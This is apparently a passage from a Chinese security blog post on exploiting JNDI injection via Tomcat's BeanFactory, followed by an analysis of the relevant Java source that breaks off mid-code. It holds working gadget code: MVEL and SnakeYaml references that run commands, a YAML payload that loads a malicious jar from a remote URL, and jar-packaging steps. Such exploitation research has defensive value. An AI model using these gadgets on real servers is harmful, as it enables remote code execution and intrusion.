+<h3 id="BeanFactory-MVEL"><a href="#BeanFactory-MVEL" class="headerlink" title="BeanFactory+MVEL"></a>BeanFactory+MVEL</h3><p>pom. xml</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mvel<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mvel2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.2.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Reference</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ResourceRef <span class="title function_">expMVEL</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;org.mvel2.sh.ShellSession&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;kk=exec&quot;</span>));  </span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;kk&quot;</span>, <span class="string">&quot;push Runtime.getRuntime().exec(&#x27;calc&#x27;);&quot;</span>));  </span><br><span class="line">    <span class="keyword">return</span> ref;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="BeanFactory-SnakeYaml"><a href="#BeanFactory-SnakeYaml" class="headerlink" title="BeanFactory+SnakeYaml"></a>BeanFactory+SnakeYaml</h3><p>pom. xml</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.33<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Reference</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ResourceRef <span class="title function_">expSnakeYaml</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;org.yaml.snakeyaml.Yaml&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line">    <span class="type">String</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    !!java.net.URL [\&quot;http://127.0.0.1:8888/exp.jar\&quot;]\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;  ]]\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;]&quot;</span>;  </span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;kk=load&quot;</span>));  </span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;kk&quot;</span>, yaml));  </span><br><span class="line">    <span class="keyword">return</span> ref;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>需要加载远程恶意 jar 包, Exp 类需实现 ScriptEngineFactory 接口</p>
+<p>Exp. java</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> <span class="keyword">implements</span> <span class="title class_">ScriptEngineFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exp</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getExtensions</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getMimeTypes</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getNames</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getParameter</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMethodCallSyntax</span><span class="params">(String obj, String m, String... args)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getOutputStatement</span><span class="params">(String toDisplay)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getProgram</span><span class="params">(String... statements)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ScriptEngine <span class="title function_">getScriptEngine</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>jar 包的制作用到了 Java SPI 机制，具体操作如下</p>
+<p>创建 META-INF&#x2F;services&#x2F;javax. script. ScriptEngineFactory 文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/209fb4f329ccdef1470485cb0f0ffe05_MD5.jpeg"
+                     
+                ></p>
+<p>写入恶意类名，跟上类的包地址, 最后打包为 jar</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp.Exp</span><br></pre></td></tr></table></figure></div>
+
+<p>然后在 exp. jar 目录下起个 web 服务，客户端直接访问即可</p>
+<h2 id="BeanFactory-利用原理分析"><a href="#BeanFactory-利用原理分析" class="headerlink" title="BeanFactory 利用原理分析"></a>BeanFactory 利用原理分析</h2><p>还是在 <code>exec</code> 打断点，看看调用栈</p>
+<blockquote>
+<p>exec: 347, Runtime (java. lang)<br>invoke0:-1, NativeMethodAccessorImpl (sun. reflect)<br>invoke: 62, NativeMethodAccessorImpl (sun. reflect)<br>invoke: 43, DelegatingMethodAccessorImpl (sun. reflect)<br>invoke: 498, Method (java. lang. reflect)<br>invoke: 158, BeanELResolver (javax. el)<br>invoke: 79, CompositeELResolver (javax. el)<br>getValue: 159, AstValue (org. apache. el. parser)<br>getValue: 190, ValueExpressionImpl (org. apache. el)<br>getValue: 61, ELProcessor (javax. el)<br>eval: 54, ELProcessor (javax. el)<br>invoke0:-1, NativeMethodAccessorImpl (sun. reflect)<br>invoke: 62, NativeMethodAccessorImpl (sun. reflect)<br>invoke: 43, DelegatingMethodAccessorImpl (sun. reflect)<br>invoke: 498, Method (java. lang. reflect)<br>getObjectInstance: 211, BeanFactory (org. apache. naming. factory)<br>getObjectInstance: 321, NamingManager (javax. naming. spi)<br>decodeObject: 499, RegistryContext (com. sun. jndi. rmi. registry)<br>lookup: 138, RegistryContext (com. sun. jndi. rmi. registry)<br>lookup: 205, GenericURLContext (com. sun. jndi. toolkit. url)<br>lookup: 417, InitialContext (javax. naming)<br>main: 7, Client</p>
+</blockquote>
+<p>1. <code>InitialContext.lookup</code> ~ <code>RegistryContext. decodeObject</code></p>
+<p>前面讲过了，没啥好说的了</p>
+<p>2. <code>NamingManager.getObjectInstance</code></p>
+<p>之前的触发点在 <code>getObjectFactoryFromReference</code> 中</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(  </span></span><br><span class="line"><span class="params">    Reference ref, String factoryName)</span>  </span><br><span class="line">    <span class="keyword">throws</span> IllegalAccessException,  </span><br><span class="line">    InstantiationException,  </span><br><span class="line">    MalformedURLException &#123;  </span><br><span class="line">    Class&lt;?&gt; clas = <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Try to use current class loader  </span></span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">         clas = helper.loadClass(factoryName);  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;  </span><br><span class="line">        <span class="comment">// ignore and continue  </span></span><br><span class="line">        <span class="comment">// e.printStackTrace();    &#125;  </span></span><br><span class="line">    <span class="comment">// All other exceptions are passed up.  </span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Not in class path; try to use codebase    String codebase;  </span></span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp;  </span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到，这里 <code>loadClass</code> 的方法不止一种，但是现在 <code>codebase</code> 加载的方法被 ban 掉了，所以就只能从本地加载，并且只能加载实现了 ObjectFactory 接口的类，不然 return 时会因为无法转型报错</p>
+<p>3. <code>BeanFactory.getObjectInstance</code></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,  </span></span><br><span class="line"><span class="params">                                Hashtable&lt;?,?&gt; environment)</span>  </span><br><span class="line">    <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference) obj;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">beanClassName</span> <span class="operator">=</span> ref.getClassName();  </span><br><span class="line">            Class&lt;?&gt; beanClass = <span class="literal">null</span>;  </span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">tcl</span> <span class="operator">=</span>  </span><br><span class="line">                Thread.currentThread().getContextClassLoader();  </span><br><span class="line">            <span class="keyword">if</span> (tcl != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    beanClass = tcl.loadClass(beanClassName);  </span><br><span class="line">                &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    beanClass = Class.forName(beanClassName);  </span><br><span class="line">                &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;  </span><br><span class="line">                    e.printStackTrace();  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">if</span> (beanClass == <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>  </span><br><span class="line">                    (<span class="string">&quot;Class not found: &quot;</span> + beanClassName);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">BeanInfo</span> <span class="variable">bi</span> <span class="operator">=</span> Introspector.getBeanInfo(beanClass);  </span><br><span class="line">            PropertyDescriptor[] pda = bi.getPropertyDescriptors();  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> beanClass.getConstructor().newInstance();  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">/* Look for properties with explicitly configured setter */</span>  </span><br><span class="line">            <span class="type">RefAddr</span> <span class="variable">ra</span> <span class="operator">=</span> ref.get(<span class="string">&quot;forceString&quot;</span>);  </span><br><span class="line">            Map&lt;String, Method&gt; forced = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">            String value;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> (ra != <span class="literal">null</span>) &#123;  </span><br><span class="line">                value = (String)ra.getContent();  </span><br><span class="line">                Class&lt;?&gt; paramTypes[] = <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">1</span>];  </span><br><span class="line">                paramTypes[<span class="number">0</span>] = String.class;  </span><br><span class="line">                String setterName;  </span><br><span class="line">                <span class="type">int</span> index;  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">/* Items are given as comma separated list */</span>  </span><br><span class="line">                <span class="keyword">for</span> (String param: value.split(<span class="string">&quot;,&quot;</span>)) &#123;  </span><br><span class="line">                    param = param.trim();  </span><br><span class="line">                    <span class="comment">/* A single item can either be of the form name=method  </span></span><br><span class="line"><span class="comment">                     * or just a property name (and we will use a standard                     * setter) */</span>                    index = param.indexOf(<span class="string">&#x27;=&#x27;</span>);  </span><br><span class="line">                    <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;  </span><br><span class="line">                        setterName = param.substring(index + <span class="number">1</span>).trim();  </span><br><span class="line">                        param = param.substring(<span class="number">0</span>, index).trim();  </span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                        setterName = <span class="string">&quot;set&quot;</span> +  </span><br><span class="line">                                     param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) +  </span><br><span class="line">                                     param.substring(<span class="number">1</span>);  </span><br><span class="line">                    &#125;  </span><br><span class="line">                    <span class="keyword">try</span> &#123;  </span><br><span class="line">                        forced.put(param,  </span><br><span class="line">                                   beanClass.getMethod(setterName, paramTypes));  </span><br><span class="line">                    &#125; <span class="keyword">catch</span> (NoSuchMethodException|SecurityException ex) &#123;  </span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>  </span><br><span class="line">                            (<span class="string">&quot;Forced String setter &quot;</span> + setterName +  </span><br><span class="line">                             <span class="string">&quot; not found for property &quot;</span> + param);  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            Enumeration&lt;RefAddr&gt; e = ref.getAll();  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">while</span> (e.hasMoreElements()) &#123;  </span><br><span class="line">  </span><br><span class="line">                ra = e.nextElement();  </span><br><span class="line">                <span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> ra.getType();  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">if</span> (propName.equals(Constants.FACTORY) ||  </span><br><span class="line">                    propName.equals(<span class="string">&quot;scope&quot;</span>) || propName.equals(<span class="string">&quot;auth&quot;</span>) ||  </span><br><span class="line">                    propName.equals(<span class="string">&quot;forceString&quot;</span>) ||  </span><br><span class="line">                    propName.equals(<span class="string">&quot;singleton&quot;</span>)) &#123;  </span><br><span class="line">                    <span class="keyword">continue</span>;  </span><br><span class="line">                &#125;  </span><br><span class="line">  </span><br><span class="line">                value = (String)ra.getContent();  </span><br><span class="line">  </span><br><span class="line">                Object[] valueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">/* Shortcut for properties with explicitly configured setter */</span>  </span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> forced.get(propName);  </span><br><span class="line">                <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    valueArray[<span class="number">0</span>] = value;  </span><br><span class="line">                    <span class="keyword">try</span> &#123;  </span><br><span class="line">                        method.invoke(bean, valueArray);  </span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IllegalAccessException|  </span><br><span class="line">                             IllegalArgumentException|  </span><br><span class="line">                             InvocationTargetException ex) &#123;  </span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>  </span><br><span class="line">                            (<span class="string">&quot;Forced String setter &quot;</span> + method.getName() +  </span><br><span class="line">                             <span class="string">&quot; threw exception for property &quot;</span> + propName);  </span><br><span class="line">                    &#125;  </span><br><span class="line">                    <span class="keyword">continue</span>;  </span><br><span class="line">                &#125;  </span><br><span class="line">  </span><br><span class="line">                <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;pda.length; i++) &#123;  </span><br><span class="line">  </span><br><span class="line">                    <span class="keyword">if</span> (pda[i].getName().equals(propName)) &#123;  </span><br><span class="line">  </span><br><span class="line">                        Class&lt;?&gt; propType = pda[i].getPropertyType();  </span><br><span class="line">  </span><br><span class="line">                        <span class="keyword">if</span> (propType.equals(String.class)) &#123;  </span><br><span class="line">                            valueArray[<span class="number">0</span>] = value;  </span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Character.class)  </span><br><span class="line">                                   || propType.equals(<span class="type">char</span>.class)) &#123;  </span><br><span class="line">                            valueArray[<span class="number">0</span>] =  </span><br><span class="line">                                Character.valueOf(value.charAt(<span class="number">0</span>));  </span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Byte.class)  </span><br><span class="line">                                   || propType.equals(<span class="type">byte</span>.class)) &#123;  </span><br><span class="line">                            